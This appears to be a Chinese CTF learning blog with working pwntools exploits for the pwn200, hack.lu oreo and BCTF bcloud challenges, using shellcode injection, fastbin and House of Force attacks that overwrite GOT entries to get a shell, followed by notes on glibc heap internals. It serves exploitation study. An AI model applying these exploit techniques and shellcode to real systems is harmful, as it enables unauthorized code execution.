<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210316223428.png" alt="20210316223428"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level=&quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">p.recv()</span><br><span class="line"></span><br><span class="line">shellcode = <span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line">p.send(shellcode + <span class="string">&quot;a&quot;</span>*(<span class="number">48</span>-<span class="built_in">len</span>(shellcode)))</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&quot;?\n&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rbp)</span><br><span class="line"></span><br><span class="line">shellcode_addr = rbp - <span class="number">0x50</span></span><br><span class="line">fake_chunk = rbp - <span class="number">0xb0</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;17&quot;</span>)	<span class="comment">#?min==17</span></span><br><span class="line">p.recvuntil(<span class="string">&quot;money~&quot;</span>)</span><br><span class="line"><span class="comment">#payload = &quot;A&quot;*0x8 + &quot;B&quot;*0x10</span></span><br><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">8</span> + p64(<span class="number">0x61</span>) + <span class="string">&quot;\x00&quot;</span>*<span class="number">0x28</span> + p64(fake_chunk)   <span class="comment">#make a fake_chunk here</span></span><br><span class="line">p.sendline(payload)</span><br><span class="line"></span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;2&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;1&quot;</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;how long?&quot;</span>,<span class="string">&quot;79&quot;</span>)   <span class="comment">#97==0x61</span></span><br><span class="line"></span><br><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">0x38</span> + p64(shellcode_addr)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;money : &quot;</span>,payload)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;choice :&quot;</span>,<span class="string">&quot;3&quot;</span>)</span><br><span class="line"></span><br><span class="line">gdb.attach(p)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>多调试！！！</p>
<h3 id="非HOS">非HOS</h3>
<p>把dest的值覆盖为free_got，；此时如果buf中为&quot;shellocde_addr&quot;+“\x00”*n，free的got表就指向shellcode，执行free时就相当于执行shellocde</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line">p = process(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./pwn200&quot;</span>)</span><br><span class="line">arch = <span class="string">&quot;amd64&quot;</span></span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p.recv()</span><br><span class="line">shellcode=<span class="string">&quot;\x6a\x42\x58\xfe\xc4\x48\x99\x52\x48\xbf\x2f\x62\x69\x6e\x2f\x2f\x73\x68\x57\x54\x5e\x49\x89\xd0\x49\x89\xd2\x0f\x05&quot;</span></span><br><span class="line">p.send(shellcode + <span class="string">&quot;a&quot;</span>*(<span class="number">48</span>-<span class="built_in">len</span>(shellcode)))	</span><br><span class="line">rbp = u64(p.recvuntil(<span class="string">&quot;?\n&quot;</span>)[<span class="number">48</span>:<span class="number">48</span>+<span class="number">6</span>].ljust(<span class="number">8</span>,<span class="string">&quot;\x00&quot;</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(rbp)</span><br><span class="line">shellcode_addr = rbp - <span class="number">0x50</span></span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(shellcode_addr)</span><br><span class="line"><span class="comment"># leak rbp &amp; shellcode_addr</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendline(<span class="string">&quot;111&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;~\n&quot;</span>)</span><br><span class="line">payload = p64(shellcode_addr) + <span class="string">&quot;\x00&quot;</span>*(<span class="number">0x38</span>-<span class="built_in">len</span>(p64(shellcode_addr))) + p64(elf.got[<span class="string">&quot;free&quot;</span>])</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(payload)</span><br><span class="line">p.recv()</span><br><span class="line">p.sendline(<span class="string">&quot;2&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<h2 id="2014-hack-lu-oreo">2014 <span class="exturl" data-url="aHR0cDovL2hhY2subHU=">hack.lu<i class="fa fa-external-link-alt"></i></span> oreo</h2>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101129.png" alt="20210331101129"></p>
<p>拖到ida里分析一波，main函数做了个初始化<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331101246.png" alt="20210331101246"><br>
sub_804898D()里包括了菜单和进入各个功能函数的跳转<br>
（说个题外话，这题用sendlineafter的话会一直等待after的字符串，不知道为啥…</p>
<p>嗯，继续</p>
<p>add：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102125.png" alt="20210331102125">add函数做了如下操作：</p>
<ul>
<li>开辟0x38大小的空间</li>
<li>从0x19的位置开始读入最长为0x38的字符串，并在末尾\0</li>
<li>从起始位置读入长度为0x38的字符串，并在末尾\0</li>
<li>add_not_order_num+1</li>
</ul>
<p>show_add:<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102328.png" alt="20210331102328"></p>
<p>order：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102253.png" alt="20210331102253"></p>
<p>bss段：<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331130920.png" alt="20210331130920"></p>
<p>整理一下这三个函数，大概能判断出枪支chunk的样子：</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">size</span><br><span class="line">describtion 	<span class="comment">//size = 0x19</span></span><br><span class="line">name	<span class="comment">//size = 0x1F</span></span><br><span class="line">pre_chunk_ptr</span><br></pre></td></tr></table></figure>
<p>cut_input:<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331102416.png" alt="20210331102416"><br>
其实就是一个把字符串末尾置为\0…再和add函数的输入部分判断一下，明显有点不安全啊…</p>
<p>大概的思路：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">1. 在add时溢出伪造指向前一个chunk的指针指向puts_got，调用show_add时就可以泄露puts的地址，获得system的地址</span><br><span class="line">接下来就只需要修改某个函数的got表指向的内容然后试着执行/bin/sh，而要做到这个需要：</span><br><span class="line">2. 把某段内存变成完全可控的chunk，且大小需要满足malloc(0x38)。看了看bss段，发现&quot;.bss:0804A2A8 order_mesg_ptr&quot;好像满足要求，而且这个位置前后也没啥用 </span><br><span class="line">3. 获得了可控的地址后寻找可以篡改的函数got，且要能执行输入的/bin/sh字符串</span><br></pre></td></tr></table></figure>
<p>第一步比较好解决：<br>
用gdb add出两个chunk，数一下就能知道payload该填多少trash<br>
<img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331165524.png" alt="20210331165524"></p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;a&quot;</span>*<span class="number">27</span> + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>])</span><br><span class="line"></span><br><span class="line">add(payload,<span class="string">&quot;aaa&quot;</span>)</span><br><span class="line">show()</span><br><span class="line"></span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: aaa\n&quot;</span>)</span><br><span class="line">p.recvuntil(<span class="string">&quot;Description: &quot;</span>)</span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">sys = puts_addr - <span class="number">0x24f00</span></span><br></pre></td></tr></table></figure>
<p>第二步，想要在bss段上构造一个chunk（如下图）的话，</p>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210331183238.png" alt="20210331183238"><br>
（另外还要把order_mesg_ptr看作chunk的size，置为0x40）</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> a&lt;<span class="number">0x3f</span>:</span><br><span class="line">	add(<span class="string">&quot;aa&quot;</span>,<span class="string">&quot;aa&quot;</span>)</span><br><span class="line">	a+=<span class="number">1</span></span><br><span class="line"><span class="comment">#0x3f and leave one here</span></span><br><span class="line">fake_chunk = <span class="number">0x0804A2A8</span></span><br><span class="line">add(<span class="string">&quot;1&quot;</span>*<span class="number">27</span>+p32(fake_chunk),<span class="string">&quot;aaaa&quot;</span>)</span><br></pre></td></tr></table></figure>
<p>是很明显的。<br>
但如何能让这块区域能够使用就要考虑free时对next_chunk的判断：</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = <span class="string">&quot;\x00&quot;</span>*<span class="number">0x20</span> + <span class="string">&quot;a&quot;</span>*<span class="number">4</span> + p32(<span class="number">100</span>)</span><br><span class="line">add_message(payload)</span><br></pre></td></tr></table></figure>
<p>此时order()后，fastbin接收的（唯一一个）chunk将在下一次malloc时分配出去<br>
随后修改strlen指向的地址就能在cut_input()时getshell</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line">payload = p32(elf.got[<span class="string">&#x27;strlen&#x27;</span>]).ljust(<span class="number">20</span>,<span class="string">&#x27;a&#x27;</span>)</span><br><span class="line">add(<span class="string">&quot;aaa&quot;</span>,payload)</span><br><span class="line">add_message(p32(sys)+<span class="string">&#x27;;/bin/sh&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"><span class="comment"># system(p32(system_addr);&quot;/bin/sh&quot;) = system(p32(system_addr));system(&quot;/bin/sh&quot;);</span></span><br></pre></td></tr></table></figure>
<p>另：写一半把ida关了，且没保存数据orz，所以最后就写的比较快且没有截图了…</p>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly9iYnMucGVkaXkuY29tL3RocmVhZC0yNDcyMTQuaHRt">https://bbs.pediy.com/thread-247214.htm<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9jdGYtd2lraS5vcmcvcHduL2xpbnV4L2dsaWJjLWhlYXAvZmFzdGJpbl9hdHRhY2svIzIwMTQtaGFja2x1LW9yZW8=">https://ctf-wiki.org/pwn/linux/glibc-heap/fastbin_attack/#2014-hacklu-oreo<i class="fa fa-external-link-alt"></i></span></p>
<h1>House of Force</h1>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">利用条件:</span><br><span class="line">- 能够以溢出等方式修改top chunk的size域</span><br><span class="line">- 自由控制堆分配的大小</span><br><span class="line"></span><br><span class="line">步骤:</span><br><span class="line">1. malloc(100)//随便分配一个chunk</span><br><span class="line">2. 使用溢出修改top chunk的size为一个大数//不会去调用mmap</span><br><span class="line">3. malloc(size)//size=目标地址减去 top chunk 地址，再减去 chunk 头的大小</span><br><span class="line">4. p = malloc(100); p == 目标地址</span><br><span class="line"></span><br><span class="line">摘自0x2l师傅的文章</span><br></pre></td></tr></table></figure>
<h2 id="题">题</h2>
<h3 id="HITCON-TRAININGLAB-11">HITCON TRAININGLAB 11</h3>
<p>略…<br>
相关记录在2021-03-22的日报里</p>
<h3 id="BCTF-bcloud">BCTF-bcloud</h3>
<p>搞了好久…现在是早上五点，不想写了<br>
注释啥的都在exp和ida文件里<br>
有两种方法，主要是把top_chunk指向bss段的content_ptr或content_len，由此可以在里边任意写，更改函数got表指向的内容。</p>
<p>画图和调试很重要！</p>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"><span class="comment">#context.log_level = &quot;debug&quot;</span></span><br><span class="line"></span><br><span class="line">p = process(<span class="string">&quot;./bcloud&quot;</span>)</span><br><span class="line">elf = ELF(<span class="string">&quot;./bcloud&quot;</span>)</span><br><span class="line">libc = ELF(<span class="string">&quot;/lib/i386-linux-gnu/libc.so.6&quot;</span>)</span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">add</span> (<span class="params"><span class="built_in">len</span>, content</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;1&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;content:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">len</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the content:\n&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">delete</span>(<span class="params"><span class="built_in">id</span></span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;4&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the id:\n&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">edit</span>(<span class="params"><span class="built_in">id</span>,content</span>):</span></span><br><span class="line">	p.recv()</span><br><span class="line">	p.sendline(<span class="string">&quot;3&quot;</span>)</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the id:&quot;</span>,<span class="built_in">str</span>(<span class="built_in">id</span>))</span><br><span class="line">	p.sendlineafter(<span class="string">&quot;Input the new content:&quot;</span>,content)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.sendafter(<span class="string">&quot;name:\n&quot;</span>,<span class="string">&quot;a&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">first_heap = u32(p.recv()[<span class="number">68</span>:<span class="number">4</span>+<span class="number">68</span>].ljust(<span class="number">4</span>,<span class="string">&quot;\x00&quot;</span>))-<span class="number">8</span> </span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;heap_base: &quot;</span> + <span class="built_in">hex</span>(first_heap)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p.send(<span class="string">&quot;A&quot;</span>*<span class="number">0x40</span>)</span><br><span class="line">p.sendlineafter(<span class="string">&quot;Host:\n&quot;</span>,p32(<span class="number">0xffffffff</span>))</span><br><span class="line">topchunk_addr = first_heap + <span class="number">0x48</span>*<span class="number">3</span>			<span class="comment">#这里第一次时候因为看gdb显示每个chunk大小是0x49，就写了0x49*3，但其实那个size应该是包括了pre_use的，因此是0x48</span></span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;topchunk_addr : &quot;</span> + <span class="built_in">hex</span>(topchunk_addr)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content_ptr = <span class="number">0x0804B120</span></span><br><span class="line">content_len = <span class="number">0x0804B0A0</span></span><br><span class="line"></span><br><span class="line">target_addr = content_len - <span class="number">8</span>		<span class="comment">#?</span></span><br><span class="line">off_target = target_addr - topchunk_addr</span><br><span class="line">malloc_size = off_target - <span class="number">4</span> -<span class="number">7</span>		<span class="comment">#??</span></span><br><span class="line"></span><br><span class="line">add(malloc_size -<span class="number">4</span> , <span class="string">&#x27;&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_size : &quot;</span> + <span class="built_in">hex</span>(malloc_size) + <span class="string">&quot;\ntarget_addr : &quot;</span> + <span class="built_in">hex</span>(target_addr)</span><br><span class="line"><span class="comment"># now, topchunk_addr -&gt; content_len-8	?</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># 关于这个topchunk指向的问题，上下两种方法在调试时，试了malloc几个相近的大小（±0x10），pwndbg的topchunk都指向0x804b000，在后面分配时也没有显示增加了chunk</span></span><br><span class="line"><span class="comment"># 目前还不知道是为啥...</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">payload = p32(<span class="number">16</span>)*<span class="number">3</span></span><br><span class="line">payload += <span class="string">&#x27;a&#x27;</span>*(content_ptr - content_len -<span class="number">12</span>) </span><br><span class="line">payload += p32(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;atoi&#x27;</span>])*<span class="number">2</span></span><br><span class="line"><span class="comment">#create 3 contents, with len==16, contents = free_got_addr, atoi_got_addr, ~</span></span><br><span class="line">add(<span class="number">1000</span>,payload)</span><br><span class="line"></span><br><span class="line">edit(<span class="number">0</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))</span><br><span class="line"><span class="comment">#free_got points to puts_plt</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">delete(<span class="number">1</span>)		<span class="comment">#puts no.1&#x27;s content, which is atoi_got_addr</span></span><br><span class="line">atoi_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;atoi_addr: &quot;</span> + <span class="built_in">hex</span>(atoi_addr)</span><br><span class="line">offset = atoi_addr - libc.symbols[<span class="string">&#x27;atoi&#x27;</span>]</span><br><span class="line">sys_addr = offset + libc.symbols[<span class="string">&#x27;system&#x27;</span>]</span><br><span class="line"></span><br><span class="line">edit(<span class="number">2</span>,p32(sys_addr))</span><br><span class="line">p.sendlineafter(<span class="string">&quot;option---&gt;&gt;\n&quot;</span>,<span class="string">&#x27;/bin/sh\x00&#x27;</span>)</span><br><span class="line">p.interactive()</span><br><span class="line"></span><br></pre></td></tr></table></figure>
<figure class="highlight py"><table><tr><td class="code"><pre><span class="line"><span class="comment">#泄露puts</span></span><br><span class="line"><span class="comment">## 前面与↑相同</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line">content_ptr = <span class="number">0x0804B120</span></span><br><span class="line">content_len = <span class="number">0x0804B0A0</span></span><br><span class="line">target_addr = content_ptr </span><br><span class="line">malloc_size = target_addr - topchunk_addr -<span class="number">0x10</span></span><br><span class="line">add(malloc_size, <span class="string">&#x27;junk&#x27;</span>)</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;malloc_size : &quot;</span> + <span class="built_in">hex</span>(malloc_size) + <span class="string">&quot;\ntarget_addr : &quot;</span> + <span class="built_in">hex</span>(target_addr)</span><br><span class="line"><span class="comment"># topchunk -&gt; content_ptr - 0x8</span></span><br><span class="line"></span><br><span class="line">add(<span class="number">0x18</span>,<span class="string">&#x27;&#x27;</span>)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 以下部分用gdb查看内存中的内容比较容易搞懂</span></span><br><span class="line">payload = p32(<span class="number">0</span>) + p32(elf.got[<span class="string">&#x27;free&#x27;</span>]) + p32(elf.got[<span class="string">&#x27;puts&#x27;</span>]) + p32(<span class="number">0x804b130</span>) + <span class="string">&#x27;/bin/sh&#x27;</span></span><br><span class="line">edit(<span class="number">1</span>,payload )</span><br><span class="line">edit(<span class="number">1</span>,p32(elf.plt[<span class="string">&#x27;puts&#x27;</span>]))    <span class="comment">#修改free_got为puts_plt</span></span><br><span class="line">delete(<span class="number">2</span>)   <span class="comment">#输出puts_addr</span></span><br><span class="line"></span><br><span class="line">puts_addr = u32(p.recv(<span class="number">4</span>))</span><br><span class="line"><span class="built_in">print</span> <span class="string">&quot;puts: &quot;</span> + <span class="built_in">hex</span>(puts_addr)</span><br><span class="line">sys_addr = puts_addr - <span class="number">0x24f00</span></span><br><span class="line"></span><br><span class="line">edit(<span class="number">1</span>,p32(sys_addr))</span><br><span class="line"><span class="comment">#gdb.attach(p)</span></span><br><span class="line">delete(<span class="number">3</span>)</span><br><span class="line">p.interactive()</span><br></pre></td></tr></table></figure>
<p>做这题的时候感觉很奇怪。首先是第一种泄露atoi的方法，似乎只在给定libc的时候有效，把获得的atoi的地址放进libc database里查的时候查不到对应的libc…而第二种泄露puts的方法就可以正常getshell</p>
<p>参考：<br>
<span class="exturl" data-url="aHR0cHM6Ly9teS5vc2NoaW5hLm5ldC91LzQzNDc2ODgvYmxvZy8zNTYxNzY1">一<i class="fa fa-external-link-alt"></i></span><br>
<span class="exturl" data-url="aHR0cHM6Ly9ibG9nLmNzZG4ubmV0L3NlYWFzZWVzYS9hcnRpY2xlL2RldGFpbHMvMTA1NTg4MDU4">二<i class="fa fa-external-link-alt"></i></span></p>
]]></content>
      <tags>
        <tag>学习</tag>
      </tags>
  </entry>
  <entry>
    <title>堆学习</title>
    <url>/21992.html</url>
    <content><![CDATA[<h1>堆相关数据结构</h1>
<h2 id="微观结构">微观结构</h2>
<h3 id="malloc-chunk">malloc_chunk</h3>
<p>程序malloc出的内存称为chunk，在ptmalloc内部用下面的结构体表示，内存空间释放后被加入空闲管理列表。一个chunk不论是分配还是释放，结构都相同。</p>
<span id="more"></span>
<p>malloc_chunk结构体</p>
<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span> &#123;</span></span><br><span class="line"></span><br><span class="line">  INTERNAL_SIZE_T      prev_size;  <span class="comment">/* 前一个chunk（物理相连，较低地址）的大小，包括chunk头（如果前一个chunk空闲），否则可以储存前一个chunk的数据，此时这个域的这个字段无效（chunk的空间复用）  */</span></span><br><span class="line">  INTERNAL_SIZE_T      size;     </span><br><span class="line">   <span class="comment">/* 该chunk的大小为2*size的整数倍（size=4或8，32或64位） </span></span><br><span class="line"><span class="comment">      该字段的低3位与大小无关，从高到低 表示</span></span><br><span class="line"><span class="comment">      “是否属于主线程NON_MAIN_ARENA”、</span></span><br><span class="line"><span class="comment">      “是否是由mmap分配IS_MAPPED”、</span></span><br><span class="line"><span class="comment">      “是否被分配PREV_INUSE”</span></span><br><span class="line"><span class="comment">    </span></span><br><span class="line"><span class="comment">  */</span></span><br><span class="line"></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd</span>;</span>         <span class="comment">/*chunk处于分配状态时从fd开始的字段为用户数据</span></span><br><span class="line"><span class="comment">  struct malloc_chunk* bk;         chunk处于空闲时fd指向前一个空闲的chunk的指针，bk指向后一个空闲的chunk指针(非物理相连)*/</span></span><br><span class="line">                                  </span><br><span class="line"></span><br><span class="line">  <span class="comment">/* Only used for large blocks: pointer to next larger size.  */</span></span><br><span class="line">  <span class="class"><span class="keyword">struct</span> <span class="title">malloc_chunk</span>* <span class="title">fd_nextsize</span>;</span>         <span class="comment">/*只有chunk空闲时才使用，用于较大的chunk</span></span><br><span class="line"><span class="comment">  struct malloc_chunk* bk_nextsize;         指向与当前chunk大小不同的第一个空闲块*/</span></span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
<p><img src="https://raw.githubusercontent.com/Brubbish/pic_bed/master/blog/20210309184724.png" alt="20210309184724"></p>
<p>一般chunk size表示malloc_chunk的实际大小，而chunk unused size 表示该chunk中除了prev_size、size、fd等辅助成员外的实际大小</p>
<h3 id="bin">bin</h3>
<p>bin是由chunk结构体组成的链表，按照chunk的大小来管理free后的chunk</p>
<p>bin链主要有以下几类，其中只有fast bin是单链表，其他都是双向链表。<br>
对于small bins，large bins，unsorted bins来说，ptmalloc将它们维护在同一个数组中，对应的数据结构在malloc_state中</p>
<h4 id="fast-bin">fast bin</h4>
<p>不属于bins，是ptmalloc单独管理小堆块的数据结构，如果free的chunk大小在0x20~0x80，会优先进入fastbin<br>
采用LIFO，用于较小的内存块。当用户需要的chunk大小小于ptmalloc的最大大小时，ptmalloc先判断fastbin中是否有对应大小的空闲块。<br>
fastbin中的chunk的inuse始终置为1，不会与其他chunk合并。但如果相邻的chunk合并后的大小大于某个值（FASTBIN_CONSOLIDATION_THRESHOLD），就需要把fastbin中的chunk合并（内存碎片）</p>
<p>fastbinsY数组中每个fastbin元素指向该链表的尾节点，尾节点通过fd指针指向前一个节点</p>
<h4 id="small-bin">small bin</h4>
<p>采用FIFO，有62个循环双向链表，每个下标对应的chunk大小都一致，关系为</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">x(下标)   2*4*x(32位)	2*8*x(64位)</span><br></pre></td></tr></table></figure>
<p>其中每个链表都有链表头结点<br>
fastbin与smallbin中的chunk的大小有很大一部分会重合，fastbin中的chunk很有可能被放到smallbin中</p>
<h4 id="large-bin">large bin</h4>
<p>包括63个bin，每个bin中的chunk大小不一致。将63个bin分成6组，每组bin中的chunk大小的公差（最大-最小）一致</p>
<table>
<thead>
<tr>
<th>组</th>
<th>数量</th>
<th>公差</th>
</tr>
</thead>
<tbody>
<tr>
<td>1</td>
<td>32</td>
<td>64B</td>
</tr>
<tr>
<td>2</td>
<td>16</td>
<td>512B</td>
</tr>
<tr>
<td>3</td>
<td>8</td>
<td>4096B</td>
</tr>
<tr>
<td>4</td>
<td>4</td>
<td>32768B</td>
</tr>
<tr>
<td>5</td>
<td>2</td>
<td>262144B</td>
</tr>
<tr>
<td>6</td>
<td>1</td>
<td>不限制</td>
</tr>
</tbody>
</table>
<p>其中所有chunk按照从大到小排列</p>
<h4 id="unsorted-bin">unsorted bin</h4>
<p>采用FIFO可以视作空闲chunk回归所属bin前的缓冲区unsorted bin只有一个链表。其中的chunk处于乱序状态，主要有两个来源：</p>
<ul>
<li>较大的chunk被分割后，剩下的部分大于minsize</li>
<li>释放一个不属于fastbin的chunk，并且该chunk不与top chunk相邻</li>
</ul>
<h3 id="top-chunk">top chunk</h3>
<p>程序第一次进行malloc时，heap会被分为两块，其中一块就是top chunk。top chunk即当前堆的物理地址最高的chunk，不属于任何一个bin，只用于在所有bin不满足请求大小时进行分配（如果大小满足），然后将剩下的部分作为top chunk，否则就对heap进行扩展然后再分配（原来的top_chunk紧接着进入unsorted bin，这里可能产生漏洞），在main_arena中通过sbrk扩展，在thread_arena中通过mmap扩展。<br>
topchunk的prev_inuse位始终为1</p>
<h3 id="last-remainder-chunk">last remainder chunk</h3>
<p>当用户请求的是一个small chunk，且该请求无法被small bin、unsorted bin满足的时候，就通过binmaps遍历bin查找最合适的chunk，如果该chunk有剩余部分的话，就将该剩余部分变成一个新的chunk加入到unsorted bin中，另外，再将该新的chunk变成新的last remainder chunk</p>
<p>此类型的chunk用于提高连续malloc(small chunk)的效率，主要是提高内存分配的局部性。那么具体是怎么提高局部性的呢？举例说明。当用户请求一个small chunk，且该请求无法被small bin满足，那么就转而交由unsorted bin处理。同时，假设当前unsorted bin中只有一个chunk的话——就是last remainder chunk，那么就将该chunk分成两部分：前者分配给用户，剩下的部分放到unsorted bin中，并成为新的last remainder chunk。这样就保证了连续malloc(small chunk)中，各个small chunk在内存分布中是相邻的，即提高了内存分配的局部性。</p>
<h2 id="宏观结构">宏观结构</h2>
<p>在glibc malloc中针对堆管理，主要涉及到以下3种数据结构：</p>
<ul>
<li>heap_info: 即Heap Header，因为一个thread arena（注意：不包含main thread）可以包含多个heaps，所以为了便于管理，就给每个heap分配一个heap header。在当前heap不够用的时候，malloc会通过系统调用mmap申请新的堆空间，新的堆空间会被添加到当前thread arena中，便于管理。</li>
<li>malloc_state: 即Arena Header，每个thread只含有一个Arena Header。Arena Header包含bins的信息、top chunk以及最后一个remainder chunk等</li>
<li>malloc_chunk: 即Chunk Header，一个heap被分为多个chunk，至于每个chunk的大小，这是根据用户的请求决定的，也就是说用户调用malloc(size)传递的size参数“就是”chunk的大小.每个chunk都由一个结构体malloc_chunk表示</li>
</ul>
<h3 id="Arena">Arena</h3>
<p>一个线程只有一个arena，各个线程的arena都是独立的。</p>
<p>每个程序中的arena数量是有限制的，与和核心数量有关，因此不是每个线程都会有独立的arena。另外，如果线程数大于核心数的两倍，就必然有线程处于等待状态，所以没有必要都分配独立的arena</p>
<p>主线程的arena称为main_arena；子线程的称为thread_arena。</p>
<p>与 thread arena 不同，main arena 的 arena header（state） 不是保存在通过 sbrk 申请的堆段里，而是作为一个全局变量，可以在 <span class="exturl" data-url="aHR0cDovL2xpYmMuc28=">libc.so<i class="fa fa-external-link-alt"></i></span> 的数据段中找到</p>
<h3 id="heap-info">heap info</h3>
<p>专门为mmap申请的内存（memory mapping segment)准备的，用来记录堆的信息和链接结构</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">Main arena 无需维护多个堆，因此也无需 heap_info。当空间耗尽时，与 thread arena 不同，main arena 可以通过 sbrk 拓展堆段，直至堆段「碰」到内存映射段；</span><br></pre></td></tr></table></figure>
<p>结构的记录的信息包括：</p>
<ul>
<li>堆对应的arena的地址</li>
<li>上一个heap_info的地址</li>
<li>当前堆的大小</li>
<li>用于对齐</li>
</ul>
<h3 id="malloc-state">malloc_state</h3>
<p>用于管理堆，记录每个arena当前申请的所有内存的具体状态。</p>
<p>无论是main arena还是thread arena，都只有一个malloc state结构。对于main arena，这个结构是一个全局变量，放在libc.so的数据段中；对于thread arena，这个结构会放在最新申请的arena中</p>
<h1>malloc的时候做了什么</h1>
<p>（以ptmalloc为例）</p>
<ul>
<li>获得锁或用mmap()开辟出非主分配区</li>
<li>将申请的内存大小转换为实际分配的内存大小</li>
</ul>
